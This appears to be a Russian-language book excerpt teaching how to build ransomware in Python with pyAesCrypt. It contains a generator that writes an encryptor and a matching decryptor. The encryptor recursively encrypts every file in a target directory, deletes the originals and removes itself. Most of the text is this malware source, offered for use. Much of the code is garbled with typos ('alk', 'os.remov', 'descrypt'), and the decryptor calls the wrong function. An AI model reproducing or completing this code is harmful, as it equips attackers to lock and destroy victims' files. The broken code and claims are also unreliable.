Шифровальщик

Этот вирус мы напишем при помощи только одной сторонней библиотеки - pyAsCrypt.
Идея: шифруем все файлы в указанной директории и всех директориях ниже. Это важное ограничение,
которое позволяет не сломать операционку. Для работы создадим два файла - шифратор и дешифратор.
После работы исполняемые будут самоудаляться.

Сначала запрашиваем путь к атакуемому каталогу и пароль для шифрования и дешифровки:

direct = input('Напиши атакуемую директорию:')
password = input('Введи пароль:')

Дальше мы будем генерировать скрипты для шифрования и дешифровки. Выглядит это примерно так:

with open('Crypt.py', 'w') as crypt:
	crypt.write('''
	текст программы
	''')

Переходим к файлам, которые мы будем использовать в качестве шаблонов. Начнем с шифратора.
Нам потребуются две стандартные библиотеки:

import os
import sys

Пишем функцию шифрования (все по мануалу pyAesCrypt):

def crypt(file):
	import pyAesCrypt
	print('-'*80)
	
	#Задаем пароль и размер буфера
	password = "'''+str(password)+'''"
	buffer_size = 512*1024
	
	#Вызываем функцию шифрования
	pyAesCrypt.encryptFile(str(file), str(file) + '.crp', password, buffer_size)
	print("[Encrypt] '"+str(file)+".crp'")

	#Удаляем исходный файл
	os.remove(file)

Вместо str(password) скрипт-генератор вставит пароль.

Важные нюансы. Шифровать и дешифровать мы будем при помощи буфера, таким образом мы избавимся от 
ограничения на размер файла (по крайней мере, значительно уменьшим это ограничение).
Вызов os.remove(file) нужен для удаления исходного файла, т.к. мы копируем файл и
шифруем копию. Можно настроить копирование файла вместо удаления.

ТЕперь функция, которая обходит папки. Тут тоже ничего сложного.

def walk(dir):
	#Перебор всех подпапок в указанной папке	
	for name in os.listdir(dir):
		path = os.path.join(dir, name)
		#Если это файл, шифруем его
		if os.path.isfile(path):
			crypt(path)
		#Если это папка, рекурсивно повторяем
		else:
			walk(path)

В конце добавим ещещ две строки. Одна для запуска обхода, вторая - самоуничтожения программы.

alk("'''+str(direct)+'''")
os.remov(str(sys.argv[0]))

Здесь снова будет подставляться нужный путь. Вот весь исходник целиком.

import os
import sys

def crypt(file):
	import pyAesCrypt
	print('-'*80)
	password = "'"+str(password)+"'"
	buffer_size = 512*1024
	pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
	print("[Encrypt] '"+str(file)+".crp'")
	os.remov(file)

def walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir, name)
		if os.path.isfile(path):
			crypt(path)
		else:
			walk(path)

alk("'''+str(direct)+'''")
rint('-'*80)
s.remove(str(sys.argv[0]))

Теперь зеркальный файл. Если в шифровальщике мы писали encrypt, то в дешифраторе пишем
decrypt. Повторять разбор тех же строк нет смысла, поэтому сразу финальный вариант.

import os
import sys

#Функция расшифровки
def decrypt(file):
	import pyAesCrypt
	print('-'*80)
	password = "'''+str(password)+'''"	
	buffer_size = 512*1024
	pyAesCrypt.descrypt(str(file), str(os.path.splitext(file)[0]), password, buffer_size)
	print("[Descrypt]'"+str(os.path.splitext(file)[0])+"'")
	os.remove(file)

#Обход каталогов
def walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir, name)
		if os.path.isfile(path):
			crypt(path)
		else:
			walk(path)

walk("'''+str(direct)+'''")
print('-'*80)
os.remove(str(sys.argv[0]))

Итого 29 строк, из которых на дешифровку ушло три. На случай, если какой-то из файлов вдруг
окажется поврежденным и возникнет ошибка, пользуемся отловом исключений (try...except).
То есть, если не получится расшифровать файл, мы его просто пропускаем. (161 стр).